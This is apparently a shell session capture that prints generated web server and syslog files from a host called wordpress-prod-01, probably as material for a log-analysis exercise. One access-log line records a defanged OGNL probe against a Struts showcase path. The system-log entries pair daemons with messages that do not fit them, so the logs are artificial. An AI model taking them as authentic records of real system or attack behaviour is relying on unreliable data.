+    10	198.51.100.40 - - [09/Aug/2026:03:13:22 +0000] "GET /struts2-showcase/ HTTP/1.1" 200 635 "-" "OGNL-probe (defanged)"
+    11	10.10.169.9 - - [09/Aug/2026:17:22:36 +0000] "GET /index.html HTTP/1.1" 200 1851 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    12	10.10.169.141 - - [09/Aug/2026:10:06:37 +0000] "GET /login HTTP/1.1" 304 5470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    13	10.10.169.2 - - [09/Aug/2026:01:25:55 +0000] "GET / HTTP/1.1" 304 624 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    14	10.10.169.122 - - [09/Aug/2026:14:29:14 +0000] "GET /favicon.ico HTTP/1.1" 200 1977 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    15	10.10.169.54 - - [09/Aug/2026:11:38:35 +0000] "GET /robots.txt HTTP/1.1" 304 1420 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    16	10.10.169.193 - - [09/Aug/2026:05:26:02 +0000] "GET /static/app.js HTTP/1.1" 200 7686 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+[?2004hroot@3d46f201add4:/app# cat -n /disk/var/log/nginx/error.log; echo "==="; cat -n /disk/var/log/syslog
+[?2004l     1	Aug  9 01:06:51 wordpress-prod-01 kernel[7307]: Received disconnect from 10.10.169.77 port 56250:11: disconnected by user
+     2	Aug  9 01:07:38 wordpress-prod-01 dbus-daemon[711]: CPU0: Package temperature normal
+     3	Aug  9 01:07:58 wordpress-prod-01 kernel[16467]: Time synchronised to time server
+     4	Aug  9 01:08:28 wordpress-prod-01 sudo[20932]: pam_unix(cron:session): session opened for user root
+     5	Aug  9 01:08:49 wordpress-prod-01 sudo[20270]: Started Session 953 of user root.
+     6	Aug  9 01:09:21 wordpress-prod-01 systemd-logind[16153]: Started Session 425 of user jenkins.
+     7	Aug  9 01:09:54 wordpress-prod-01 sshd[435]: Received disconnect from 10.10.169.66 port 53501:11: disconnected by user
+     8	Aug  9 01:09:58 wordpress-prod-01 sshd[17982]: Time synchronised to time server
+     9	Aug  9 01:10:19 wordpress-prod-01 chronyd[12639]: Started Session 817 of user root.
+    10	Aug  9 01:11:04 wordpress-prod-01 sshd[11340]: Time synchronised to time server
+    11	Aug  9 01:11:39 wordpress-prod-01 sshd[3276]: Received disconnect from 10.10.169.234 port 55722:11: disconnected by user
+    12	Aug  9 01:11:42 wordpress-prod-01 kernel[27808]: Started Session 324 of user devops.
+    13	Aug  9 01:11:48 wordpress-prod-01 systemd[15185]: pam_unix(cron:session): session opened for user root
+    14	Aug  9 01:11:49 wordpress-prod-01 kernel[5245]: Received disconnect from 10.10.169.109 port 60717:11: disconnected by user
+    15	Aug  9 01:12:26 wordpress-prod-01 kernel[27444]: Received disconnect from 10.10.169.193 port 44704:11: disconnected by user
+    16	Aug  9 01:12:47 wordpress-prod-01 sshd[23338]: Started Session 160 of user jenkins.
+    17	Aug  9 01:12:58 wordpress-prod-01 systemd-logind[28590]: Started Session 871 of user devops.
+    18	Aug  9 01:12:59 wordpress-prod-01 CRON[17247]: Started Session 913 of user jenkins.
+    19	Aug  9 01:13:39 wordpress-prod-01 systemd[21869]: Time synchronised to time server
+    20	Aug  9 01:14:29 wordpress-prod-01 chronyd[11713]: CPU0: Package temperature normal
+    21	Aug  9 01:14:43 wordpress-prod-01 chronyd[17590]: Time synchronised to time server
+    22	Aug  9 01:15:30 wordpress-prod-01 sudo[20217]: Started Session 487 of user postgres.
+    23	Aug  9 01:15:42 wordpress-prod-01 systemd[7292]: CPU0: Package temperature normal
+    24	Aug  9 01:15:43 wordpress-prod-01 systemd[12045]: Time synchronised to time server
+    25	Aug  9 01:15:44 wordpress-prod-01 systemd-logind[10954]: pam_unix(cron:session): session opened for user root
+    26	Aug  9 01:15:59 wordpress-prod-01 sshd[15727]: CPU0: Package temperature normal
+    27	Aug  9 01:16:22 wordpress-prod-01 systemd[15314]: CPU0: Package temperature normal
+    28	Aug  9 01:16:51 wordpress-prod-01 sudo[6536]: CPU0: Package temperature normal
+    29	Aug  9 01:17:10 wordpress-prod-01 sudo[7354]: Received disconnect from 10.10.169.13 port 50131:11: disconnected by user
+    30	Aug  9 01:17:47 wordpress-prod-01 sshd[19367]: Started Session 59 of user devops.
+    31	Aug  9 01:18:03 wordpress-prod-01 chronyd[20705]: Time synchronised to time server
+    32	Aug  9 01:18:31 wordpress-prod-01 dbus-daemon[6640]: pam_unix(cron:session): session opened for user root
+    33	Aug  9 01:18:59 wordpress-prod-01 dbus-daemon[15758]: pam_unix(cron:session): session opened for user root
+    34	Aug  9 01:19:40 wordpress-prod-01 chronyd[21543]: Started Session 301 of user devops.
+    35	Aug  9 01:20:06 wordpress-prod-01 dbus-daemon[3583]: Received disconnect from 10.10.169.216 port 64164:11: disconnected by user
+    36	Aug  9 01:20:35 wordpress-prod-01 dbus-daemon[28420]: CPU0: Package temperature normal
+    37	Aug  9 01:21:23 wordpress-prod-01 sudo[14429]: CPU0: Package temperature normal
+    38	Aug  9 01:21:36 wordpress-prod-01 CRON[5810]: pam_unix(cron:session): session opened for user root
+    39	Aug  9 01:22:29 wordpress-prod-01 sudo[1750]: CPU0: Package temperature normal
+    40	Aug  9 01:22:49 wordpress-prod-01 systemd[28107]: Started Session 106 of user svc-backup.
+    41	Aug  9 01:23:06 wordpress-prod-01 kernel[19024]: Received disconnect from 10.10.169.223 port 60610:11: disconnected by user
+    42	Aug  9 01:23:42 wordpress-prod-01 systemd[28552]: Received disconnect from 10.10.169.204 port 57869:11: disconnected by user
+    43	Aug  9 01:24:23 wordpress-prod-01 chronyd[22225]: CPU0: Package temperature normal
+    44	Aug  9 01:25:00 wordpress-prod-01 systemd[18768]: CPU0: Package temperature normal
+    45	Aug  9 01:25:32 wordpress-prod-01 sudo[15733]: Started Session 127 of user webadmin.
+    46	Aug  9 01:25:34 wordpress-prod-01 dbus-daemon[16503]: Received disconnect from 10.10.169.211 port 41217:11: disconnected by user
+    47	Aug  9 01:26:07 wordpress-prod-01 systemd-logind[27664]: pam_unix(cron:session): session opened for user root
+    48	Aug  9 01:26:39 wordpress-prod-01 CRON[27428]: Received disconnect from 10.10.169.159 port 48524:11: disconnected by user
+    49	Aug  9 01:27:23 wordpress-prod-01 sshd[13669]: pam_unix(cron:session): session opened for user root
+    50	Aug  9 01:28:05 wordpress-prod-01 CRON[27601]: Started Session 888 of user webadmin.
+    51	Aug  9 01:28:15 wordpress-prod-01 systemd-logind[28686]: Started Session 171 of user svc-backup.
+    52	Aug  9 01:28:48 wordpress-prod-01 kernel[25064]: CPU0: Package temperature normal
+    53	Aug  9 01:29:34 wordpress-prod-01 chronyd[8915]: Time synchronised to time server
+    54	Aug  9 01:29:59 wordpress-prod-01 CRON[943]: Time synchronised to time server
+    55	Aug  9 01:30:19 wordpress-prod-01 dbus-daemon[522]: Received disconnect from 10.10.169.46 port 55477:11: disconnected by user
+    56	Aug  9 01:31:05 wordpress-prod-01 dbus-daemon[26372]: Received disconnect from 10.10.169.51 port 49525:11: disconnected by user
+    57	Aug  9 01:31:07 wordpress-prod-01 kernel[15367]: Time synchronised to time server
+    58	Aug  9 01:31:41 wordpress-prod-01 chronyd[10782]: CPU0: Package temperature normal
+    59	Aug  9 01:32:21 wordpress-prod-01 systemd[11923]: Time synchronised to time server
+    60	Aug  9 01:32:58 wordpress-prod-01 chronyd[6532]: Started Session 397 of user postgres.
+===
+     1	Aug  9 01:07:10 wordpress-prod-01 kernel[11559]: Time synchronised to time server
+     2	Aug  9 01:07:30 wordpress-prod-01 systemd[19908]: CPU0: Package temperature normal
+     3	Aug  9 01:07:58 wordpress-prod-01 CRON[5722]: pam_unix(cron:session): session opened for user root
+     4	Aug  9 01:08:29 wordpress-prod-01 chronyd[15606]: pam_unix(cron:session): session opened for user root
+     5	Aug  9 01:08:37 wordpress-prod-01 CRON[906]: pam_unix(cron:session): session opened for user root
+     6	Aug  9 01:08:43 wordpress-prod-01 sshd[13932]: CPU0: Package temperature normal
+     7	Aug  9 01:09:23 wordpress-prod-01 sshd[15198]: CPU0: Package temperature normal
+     8	Aug  9 01:09:31 wordpress-prod-01 sudo[8066]: pam_unix(cron:session): session opened for user root
+     9	Aug  9 01:10:26 wordpress-prod-01 systemd[24212]: Time synchronised to time server
+    10	Aug  9 01:10:54 wordpress-prod-01 systemd[7504]: Received disconnect from 10.10.169.18 port 52957:11: disconnected by user
+    11	Aug  9 01:11:24 wordpress-prod-01 CRON[9362]: Started Session 501 of user postgres.
+    12	Aug  9 01:11:34 wordpress-prod-01 dbus-daemon[21085]: pam_unix(cron:session): session opened for user root
+    13	Aug  9 01:12:20 wordpress-prod-01 systemd[24792]: Time synchronised to time server
+    14	Aug  9 01:12:22 wordpress-prod-01 dbus-daemon[15070]: CPU0: Package temperature normal
+    15	Aug  9 01:12:39 wordpress-prod-01 dbus-daemon[11193]: Started Session 720 of user devops.
+    16	Aug  9 01:13:34 wordpress-prod-01 chronyd[26621]: Started Session 966 of user svc-backup.
+    17	Aug  9 01:14:23 wordpress-prod-01 systemd-logind[6746]: Received disconnect from 10.10.169.100 port 41414:11: disconnected by user
+    18	Aug  9 01:15:10 wordpress-prod-01 systemd[19106]: CPU0: Package temperature normal
+    19	Aug  9 01:15:33 wordpress-prod-01 chronyd[24969]: pam_unix(cron:session): session opened for user root
+    20	Aug  9 01:16:06 wordpress-prod-01 sudo[8067]: CPU0: Package temperature normal
+    21	Aug  9 01:16:21 wordpress-prod-01 CRON[9179]: Started Session 408 of user devops.
+    22	Aug  9 01:16:54 wordpress-prod-01 chronyd[13903]: CPU0: Package temperature normal
+    23	Aug  9 01:17:18 wordpress-prod-01 systemd-logind[1903]: pam_unix(cron:session): session opened for user root
+    24	Aug  9 01:17:42 wordpress-prod-01 sudo[23740]: Started Session 334 of user webadmin.
+    25	Aug  9 01:18:26 wordpress-prod-01 systemd-logind[8084]: CPU0: Package temperature normal
+    26	Aug  9 01:18:49 wordpress-prod-01 sshd[26082]: CPU0: Package temperature normal
+    27	Aug  9 01:19:22 wordpress-prod-01 dbus-daemon[27144]: Started Session 66 of user svc-backup.
+    28	Aug  9 01:19:51 wordpress-prod-01 systemd-logind[24844]: Time synchronised to time server
+    29	Aug  9 01:20:00 wordpress-prod-01 systemd-logind[12626]: Started Session 524 of user root.
+    30	Aug  9 01:20:14 wordpress-prod-01 systemd[2854]: Time synchronised to time server
+    31	Aug  9 01:20:37 wordpress-prod-01 systemd-logind[7232]: Received disconnect from 10.10.169.170 port 48886:11: disconnected by user
+    32	Aug  9 01:21:27 wordpress-prod-01 kernel[4950]: pam_unix(cron:session): session opened for user root
+    33	Aug  9 01:22:20 wordpress-prod-01 kernel[11333]: CPU0: Package temperature normal
+    34	Aug  9 01:22:48 wordpress-prod-01 kernel[26807]: CPU0: Package temperature normal
+    35	Aug  9 01:23:33 wordpress-prod-01 systemd[20631]: pam_unix(cron:session): session opened for user root
+    36	Aug  9 01:23:38 wordpress-prod-01 sudo[2863]: pam_unix(cron:session): session opened for user root
+    37	Aug  9 01:24:18 wordpress-prod-01 systemd-logind[4114]: Time synchronised to time server
+    38	Aug  9 01:24:39 wordpress-prod-01 sshd[3382]: Started Session 796 of user devops.
+    39	Aug  9 01:25:21 wordpress-prod-01 sudo[14951]: Started Session 432 of user jenkins.
+    40	Aug  9 01:25:39 wordpress-prod-01 dbus-daemon[28128]: pam_unix(cron:session): session opened for user root
+    41	Aug  9 01:26:18 wordpress-prod-01 systemd[7528]: Received disconnect from 10.10.169.239 port 46047:11: disconnected by user
+    42	Aug  9 01:26:41 wordpress-prod-01 dbus-daemon[8629]: Started Session 857 of user webadmin.
+    43	Aug  9 01:26:50 wordpress-prod-01 systemd[26830]: Time synchronised to time server
+    44	Aug  9 01:27:14 wordpress-prod-01 sudo[1316]: CPU0: Package temperature normal
+    45	Aug  9 01:27:30 wordpress-prod-01 systemd[28301]: CPU0: Package temperature normal
+    46	Aug  9 01:28:02 wordpress-prod-01 sshd[14228]: pam_unix(cron:session): session opened for user root
+    47	Aug  9 01:28:19 wordpress-prod-01 CRON[24991]: pam_unix(cron:session): session opened for user root
+    48	Aug  9 01:28:42 wordpress-prod-01 systemd[27277]: pam_unix(cron:session): session opened for user root
+    49	Aug  9 01:28:56 wordpress-prod-01 CRON[11693]: pam_unix(cron:session): session opened for user root
+    50	Aug  9 01:29:16 wordpress-prod-01 CRON[3998]: Started Session 330 of user svc-backup.
+    51	Aug  9 01:30:09 wordpress-prod-01 systemd-logind[2848]: CPU0: Package temperature normal
+    52	Aug  9 01:30:26 wordpress-prod-01 sudo[13044]: pam_unix(cron:session): session opened for user root
+    53	Aug  9 01:30:39 wordpress-prod-01 dbus-daemon[20789]: Time synchronised to time server
+    54	Aug  9 01:30:47 wordpress-prod-01 kernel[18135]: pam_unix(cron:session): session opened for user root
+    55	Aug  9 01:31:30 wordpress-prod-01 sudo[11466]: pam_unix(cron:session): session opened for user root
+    56	Aug  9 01:32:16 wordpress-prod-01 systemd[1675]: Time synchronised to time server
+    57	Aug  9 01:32:47 wordpress-prod-01 dbus-daemon[29257]: pam_unix(cron:session): session opened for user root
+    58	Aug  9 01:33:26 wordpress-prod-01 sudo[29584]: Started Session 242 of user root.
+    59	Aug  9 01:34:10 wordpress-prod-01 CRON[1981]: pam_unix(cron:session): session opened for user root
+    60	Aug  9 01:34:12 wordpress-prod-01 systemd-logind[12253]: CPU0: Package temperature normal
+    61	Aug  9 01:35:06 wordpress-prod-01 systemd[24215]: Received disconnect from 10.10.169.128 port 56380:11: disconnected by user
+    62	Aug  9 01:35:11 wordpress-prod-01 systemd[25674]: CPU0: Package temperature normal
+    63	Aug  9 01:35:31 wordpress-prod-01 CRON[6974]: Time synchronised to time server
+    64	Aug  9 01:36:21 wordpress-prod-01 CRON[29369]: Started Session 641 of user webadmin.
+    65	Aug  9 01:36:34 wordpress-prod-01 kernel[16009]: Started Session 33 of user devops.
+    66	Aug  9 01:36:37 wordpress-prod-01 dbus-daemon[16479]: Received disconnect from 10.10.169.237 port 58133:11: disconnected by user
+    67	Aug  9 01:36:40 wordpress-prod-01 CRON[18425]: Received disconnect from 10.10.169.81 port 42815:11: disconnected by user
+    68	Aug  9 01:37:10 wordpress-prod-01 kernel[6560]: CPU0: Package temperature normal
+    69	Aug  9 01:37:42 wordpress-prod-01 sudo[9262]: Started Session 5 of user postgres.
+    70	Aug  9 01:37:52 wordpress-prod-01 kernel[29736]: Started Session 12 of user postgres.
+    71	Aug  9 01:38:15 wordpress-prod-01 sshd[19833]: Received disconnect from 10.10.169.111 port 61234:11: disconnected by user
+    72	Aug  9 01:38:24 wordpress-prod-01 sshd[13623]: pam_unix(cron:session): session opened for user root
+    73	Aug  9 01:38:46 wordpress-prod-01 kernel[10613]: CPU0: Package temperature normal
+    74	Aug  9 01:38:48 wordpress-prod-01 dbus-daemon[7486]: Time synchronised to time server
+    75	Aug  9 01:39:36 wordpress-prod-01 systemd-logind[25864]: Started Session 412 of user webadmin.
+    76	Aug  9 01:40:15 wordpress-prod-01 systemd-logind[4852]: Time synchronised to time server
+    77	Aug  9 01:41:03 wordpress-prod-01 sshd[13364]: Started Session 888 of user devops.
+    78	Aug  9 01:41:39 wordpress-prod-01 dbus-daemon[4831]: Started Session 197 of user jenkins.
+    79	Aug  9 01:42:14 wordpress-prod-01 sudo[24148]: Started Session 791 of user jenkins.
+    80	Aug  9 01:43:04 wordpress-prod-01 CRON[14896]: CPU0: Package temperature normal
+    81	Aug  9 01:43:47 wordpress-prod-01 systemd-logind[16165]: Time synchronised to time server
+    82	Aug  9 01:44:38 wordpress-prod-01 dbus-daemon[14814]: pam_unix(cron:session): session opened for user root
+    83	Aug  9 01:44:40 wordpress-prod-01 CRON[15352]: Started Session 70 of user jenkins.
+    84	Aug  9 01:44:50 wordpress-prod-01 chronyd[29597]: Started Session 358 of user postgres.
+    85	Aug  9 01:45:11 wordpress-prod-01 systemd-logind[3828]: CPU0: Package temperature normal
+    86	Aug  9 01:45:38 wordpress-prod-01 systemd[15163]: pam_unix(cron:session): session opened for user root
+    87	Aug  9 01:46:02 wordpress-prod-01 dbus-daemon[8320]: CPU0: Package temperature normal
+    88	Aug  9 01:46:32 wordpress-prod-01 systemd[22062]: CPU0: Package temperature normal
+    89	Aug  9 01:47:12 wordpress-prod-01 CRON[10628]: Time synchronised to time server
+    90	Aug  9 01:47:33 wordpress-prod-01 CRON[13011]: CPU0: Package temperature normal
+    91	Aug  9 01:47:41 wordpress-prod-01 chronyd[5201]: CPU0: Package temperature normal
+    92	Aug  9 01:48:26 wordpress-prod-01 kernel[20445]: Received disconnect from 10.10.169.143 port 55713:11: disconnected by user
+    93	Aug  9 01:48:54 wordpress-prod-01 dbus-daemon[22005]: CPU0: Package temperature normal
+    94	Aug  9 01:49:44 wordpress-prod-01 sudo[1824]: CPU0: Package temperature normal
+    95	Aug  9 01:50:00 wordpress-prod-01 sudo[1584]: CPU0: Package temperature normal
+    96	Aug  9 01:50:17 wordpress-prod-01 sudo[3853]: CPU0: Package temperature normal
+    97	Aug  9 01:50:58 wordpress-prod-01 sshd[6023]: pam_unix(cron:session): session opened for user root
+    98	Aug  9 01:51:03 wordpress-prod-01 sshd[6925]: Started Session 72 of user svc-backup.
+    99	Aug  9 01:51:19 wordpress-prod-01 chronyd[21544]: pam_unix(cron:session): session opened for user root
+   100	Aug  9 01:52:02 wordpress-prod-01 CRON[15601]: Started Session 335 of user webadmin.
+   101	Aug  9 01:52:39 wordpress-prod-01 kernel[23154]: CPU0: Package temperature normal
+   102	Aug  9 01:53:22 wordpress-prod-01 kernel[7972]: pam_unix(cron:session): session opened for user root
+   103	Aug  9 01:53:27 wordpress-prod-01 CRON[9036]: Started Session 6 of user root.
+   104	Aug  9 01:53:53 wordpress-prod-01 sudo[14563]: Received disconnect from 10.10.169.184 port 51136:11: disconnected by user
+   105	Aug  9 01:53:57 wordpress-prod-01 systemd[14964]: CPU0: Package temperature normal
+   106	Aug  9 01:54:03 wordpress-prod-01 sshd[20765]: Received disconnect from 10.10.169.210 port 53267:11: disconnected by user
+   107	Aug  9 01:54:27 wordpress-prod-01 systemd-logind[5673]: pam_unix(cron:session): session opened for user root
+   108	Aug  9 01:54:41 wordpress-prod-01 systemd[16002]: Time synchronised to time server
+   109	Aug  9 01:55:36 wordpress-prod-01 systemd-logind[10930]: Started Session 445 of user postgres.
+   110	Aug  9 01:56:08 wordpress-prod-01 kernel[21629]: CPU0: Package temperature normal
+   111	Aug  9 01:56:26 wordpress-prod-01 CRON[19826]: pam_unix(cron:session): session opened for user root
+   112	Aug  9 01:57:14 wordpress-prod-01 sshd[11288]: Started Session 962 of user root.
+   113	Aug  9 01:57:41 wordpress-prod-01 chronyd[6190]: Started Session 543 of user root.
+   114	Aug  9 01:57:47 wordpress-prod-01 systemd-logind[24855]: Time synchronised to time server
+   115	Aug  9 01:58:29 wordpress-prod-01 sudo[21647]: Started Session 911 of user root.
+   116	Aug  9 01:59:10 wordpress-prod-01 systemd-logind[9087]: Received disconnect from 10.10.169.19 port 57828:11: disconnected by user
+   117	Aug  9 01:59:17 wordpress-prod-01 sudo[19567]: Time synchronised to time server
+   118	Aug  9 01:59:49 wordpress-prod-01 sshd[16015]: Time synchronised to time server
+   119	Aug  9 02:00:40 wordpress-prod-01 sudo[10277]: Started Session 783 of user svc-backup.
+   120	Aug  9 02:00:44 wordpress-prod-01 chronyd[5532]: pam_unix(cron:session): session opened for user root
+   121	Aug  9 02:01:11 wordpress-prod-01 dbus-daemon[24115]: Time synchronised to time server
+   122	Aug  9 02:02:01 wordpress-prod-01 sudo[11015]: Time synchronised to time server
+   123	Aug  9 02:02:50 wordpress-prod-01 CRON[5534]: pam_unix(cron:session): session opened for user root
+   124	Aug  9 02:02:55 wordpress-prod-01 dbus-daemon[19823]: pam_unix(cron:session): session opened for user root
+   125	Aug  9 02:03:25 wordpress-prod-01 sudo[5534]: Started Session 713 of user devops.
+   126	Aug  9 02:04:09 wordpress-prod-01 chronyd[18703]: Started Session 476 of user devops.
+   127	Aug  9 02:04:15 wordpress-prod-01 sudo[13731]: Started Session 805 of user postgres.
+   128	Aug  9 02:04:20 wordpress-prod-01 sshd[4303]: pam_unix(cron:session): session opened for user root
+   129	Aug  9 02:05:03 wordpress-prod-01 sudo[10321]: CPU0: Package temperature normal
+   130	Aug  9 02:05:14 wordpress-prod-01 chronyd[11871]: pam_unix(cron:session): session opened for user root
+   131	Aug  9 02:05:16 wordpress-prod-01 CRON[20533]: Time synchronised to time server
+   132	Aug  9 02:05:22 wordpress-prod-01 systemd-logind[27404]: pam_unix(cron:session): session opened for user root
+   133	Aug  9 02:06:01 wordpress-prod-01 sudo[2119]: CPU0: Package temperature normal
+   134	Aug  9 02:06:33 wordpress-prod-01 systemd[3776]: Started Session 288 of user devops.
+   135	Aug  9 02:07:22 wordpress-prod-01 systemd[24792]: Time synchronised to time server
+   136	Aug  9 02:07:58 wordpress-prod-01 systemd[24868]: Started Session 469 of user root.
+   137	Aug  9 02:08:07 wordpress-prod-01 sshd[9460]: Received disconnect from 10.10.169.200 port 45454:11: disconnected by user
+   138	Aug  9 02:08:41 wordpress-prod-01 sudo[10055]: Started Session 809 of user postgres.
+   139	Aug  9 02:09:29 wordpress-prod-01 kernel[7759]: Time synchronised to time server
+   140	Aug  9 02:09:50 wordpress-prod-01 sshd[20779]: Received disconnect from 10.10.169.222 port 50244:11: disconnected by user
+   141	Aug  9 02:10:35 wordpress-prod-01 sudo[18425]: Time synchronised to time server
+   142	Aug  9 02:10:51 wordpress-prod-01 systemd[15128]: pam_unix(cron:session): session opened for user root
+   143	Aug  9 02:11:03 wordpress-prod-01 kernel[3995]: Received disconnect from 10.10.169.43 port 61543:11: disconnected by user
+   144	Aug  9 02:11:35 wordpress-prod-01 kernel[19277]: Started Session 126 of user webadmin.
+   145	Aug  9 02:11:43 wordpress-prod-01 sudo[23987]: Received disconnect from 10.10.169.70 port 45779:11: disconnected by user
+   146	Aug  9 02:12:06 wordpress-prod-01 systemd[29170]: Received disconnect from 10.10.169.67 port 43232:11: disconnected by user
+   147	Aug  9 02:12:11 wordpress-prod-01 sshd[1862]: Started Session 974 of user webadmin.
+   148	Aug  9 02:12:25 wordpress-prod-01 sshd[20627]: pam_unix(cron:session): session opened for user root
+   149	Aug  9 02:12:37 wordpress-prod-01 CRON[19915]: Received disconnect from 10.10.169.13 port 40879:11: disconnected by user
+   150	Aug  9 02:12:43 wordpress-prod-01 CRON[20324]: Received disconnect from 10.10.169.162 port 51273:11: disconnected by user
+   151	Aug  9 02:13:38 wordpress-prod-01 dbus-daemon[19043]: Time synchronised to time server
+   152	Aug  9 02:13:50 wordpress-prod-01 dbus-daemon[8439]: Time synchronised to time server
+   153	Aug  9 02:14:17 wordpress-prod-01 chronyd[2775]: pam_unix(cron:session): session opened for user root
+   154	Aug  9 02:15:00 wordpress-prod-01 systemd[17908]: CPU0: Package temperature normal
+   155	Aug  9 02:15:33 wordpress-prod-01 chronyd[9988]: Received disconnect from 10.10.169.101 port 61403:11: disconnected by user
+   156	Aug  9 02:16:02 wordpress-prod-01 systemd-logind[24776]: Time synchronised to time server
+   157	Aug  9 02:16:54 wordpress-prod-01 CRON[3404]: Received disconnect from 10.10.169.199 port 40829:11: disconnected by user
+   158	Aug  9 02:17:43 wordpress-prod-01 systemd[11881]: Time synchronised to time server
+   159	Aug  9 02:17:53 wordpress-prod-01 systemd[28080]: Received disconnect from 10.10.169.42 port 49317:11: disconnected by user
+   160	Aug  9 02:17:58 wordpress-prod-01 CRON[7648]: Time synchronised to time server
+   161	Aug  9 02:18:18 wordpress-prod-01 sudo[24929]: pam_unix(cron:session): session opened for user root
+   162	Aug  9 02:18:51 wordpress-prod-01 CRON[9227]: Time synchronised to time server
+   163	Aug  9 02:19:06 wordpress-prod-01 chronyd[12935]: Received disconnect from 10.10.169.139 port 57311:11: disconnected by user
+   164	Aug  9 02:19:14 wordpress-prod-01 kernel[11892]: CPU0: Package temperature normal
+   165	Aug  9 02:19:24 wordpress-prod-01 chronyd[27500]: Time synchronised to time server
+   166	Aug  9 02:20:00 wordpress-prod-01 systemd[16369]: Time synchronised to time server
+   167	Aug  9 02:20:20 wordpress-prod-01 systemd-logind[24648]: Received disconnect from 10.10.169.203 port 46630:11: disconnected by user
+   168	Aug  9 02:21:02 wordpress-prod-01 sudo[27389]: pam_unix(cron:session): session opened for user root
+   169	Aug  9 02:21:07 wordpress-prod-01 kernel[29133]: Started Session 972 of user jenkins.
+   170	Aug  9 02:21:56 wordpress-prod-01 kernel[8559]: Started Session 63 of user devops.
+   171	Aug  9 02:22:12 wordpress-prod-01 sshd[5492]: pam_unix(cron:session): session opened for user root
+   172	Aug  9 02:23:02 wordpress-prod-01 kernel[2406]: Started Session 738 of user webadmin.
+   173	Aug  9 02:23:46 wordpress-prod-01 systemd[15822]: Started Session 593 of user jenkins.
+   174	Aug  9 02:24:20 wordpress-prod-01 systemd-logind[26490]: Started Session 326 of user jenkins.
+   175	Aug  9 02:25:07 wordpress-prod-01 sshd[25737]: Received disconnect from 10.10.169.91 port 47717:11: disconnected by user
+   176	Aug  9 02:25:39 wordpress-prod-01 kernel[24028]: CPU0: Package temperature normal
+   177	Aug  9 02:25:51 wordpress-prod-01 systemd-logind[21326]: CPU0: Package temperature normal
+   178	Aug  9 02:26:27 wordpress-prod-01 systemd-logind[26212]: CPU0: Package temperature normal
+   179	Aug  9 02:27:18 wordpress-prod-01 sshd[16533]: Time synchronised to time server
+   180	Aug  9 02:27:41 wordpress-prod-01 kernel[11176]: Started Session 309 of user devops.
+   181	Aug  9 02:28:17 wordpress-prod-01 systemd-logind[10799]: CPU0: Package temperature normal
+   182	Aug  9 02:29:12 wordpress-prod-01 kernel[17047]: pam_unix(cron:session): session opened for user root
+   183	Aug  9 02:30:04 wordpress-prod-01 CRON[15116]: Received disconnect from 10.10.169.145 port 50324:11: disconnected by user
+   184	Aug  9 02:30:34 wordpress-prod-01 systemd-logind[20631]: pam_unix(cron:session): session opened for user root
+   185	Aug  9 02:30:56 wordpress-prod-01 dbus-daemon[21945]: Started Session 591 of user webadmin.
+   186	Aug  9 02:31:20 wordpress-prod-01 chronyd[9983]: Received disconnect from 10.10.169.231 port 44494:11: disconnected by user
+   187	Aug  9 02:31:55 wordpress-prod-01 kernel[18871]: Received disconnect from 10.10.169.27 port 46738:11: disconnected by user
+   188	Aug  9 02:32:16 wordpress-prod-01 sshd[17336]: Time synchronised to time server
+   189	Aug  9 02:33:10 wordpress-prod-01 sshd[15691]: pam_unix(cron:session): session opened for user root
+   190	Aug  9 02:34:02 wordpress-prod-01 dbus-daemon[11750]: CPU0: Package temperature normal
+   191	Aug  9 02:34:37 wordpress-prod-01 sshd[12025]: CPU0: Package temperature normal
+   192	Aug  9 02:34:46 wordpress-prod-01 chronyd[21148]: pam_unix(cron:session): session opened for user root
+   193	Aug  9 02:35:32 wordpress-prod-01 chronyd[9518]: pam_unix(cron:session): session opened for user root
+   194	Aug  9 02:36:05 wordpress-prod-01 kernel[23292]: Received disconnect from 10.10.169.5 port 59338:11: disconnected by user
+   195	Aug  9 02:36:13 wordpress-prod-01 systemd[14303]: Received disconnect from 10.10.169.69 port 59422:11: disconnected by user
+   196	Aug  9 02:36:28 wordpress-prod-01 kernel[16765]: Time synchronised to time server
+   197	Aug  9 02:37:21 wordpress-prod-01 dbus-daemon[15246]: Time synchronised to time server
+   198	Aug  9 02:38:14 wordpress-prod-01 CRON[10878]: Time synchronised to time server
+   199	Aug  9 02:38:34 wordpress-prod-01 chronyd[11019]: pam_unix(cron:session): session opened for user root
+   200	Aug  9 02:38:59 wordpress-prod-01 kernel[2365]: Received disconnect from 10.10.169.150 port 63306:11: disconnected by user
+   201	Aug  9 02:39:35 wordpress-prod-01 dbus-daemon[10669]: CPU0: Package temperature normal
+   202	Aug  9 02:40:25 wordpress-prod-01 kernel[19454]: CPU0: Package temperature normal
+   203	Aug  9 02:41:14 wordpress-prod-01 systemd-logind[5994]: Time synchronised to time server
+   204	Aug  9 02:41:35 wordpress-prod-01 systemd-logind[19717]: pam_unix(cron:session): session opened for user root
+   205	Aug  9 02:42:09 wordpress-prod-01 sudo[701]: Received disconnect from 10.10.169.120 port 44094:11: disconnected by user
+   206	Aug  9 02:42:42 wordpress-prod-01 chronyd[16928]: pam_unix(cron:session): session opened for user root
+   207	Aug  9 02:43:17 wordpress-prod-01 sshd[25366]: CPU0: Package temperature normal
+   208	Aug  9 02:43:40 wordpress-prod-01 kernel[21616]: Started Session 445 of user jenkins.
+   209	Aug  9 02:44:06 wordpress-prod-01 kernel[17037]: Started Session 210 of user webadmin.
+   210	Aug  9 02:44:10 wordpress-prod-01 systemd-logind[12870]: Received disconnect from 10.10.169.166 port 41023:11: disconnected by user
+   211	Aug  9 02:44:46 wordpress-prod-01 sshd[17428]: Started Session 141 of user svc-backup.
+   212	Aug  9 02:45:00 wordpress-prod-01 systemd[4393]: Started Session 321 of user webadmin.
+   213	Aug  9 02:45:25 wordpress-prod-01 systemd-logind[12263]: Started Session 161 of user postgres.
+   214	Aug  9 02:45:51 wordpress-prod-01 kernel[13516]: CPU0: Package temperature normal
+   215	Aug  9 02:46:36 wordpress-prod-01 systemd[16353]: Started Session 678 of user jenkins.
+   216	Aug  9 02:46:42 wordpress-prod-01 sshd[9815]: pam_unix(cron:session): session opened for user root
+   217	Aug  9 02:47:21 wordpress-prod-01 dbus-daemon[20438]: CPU0: Package temperature normal
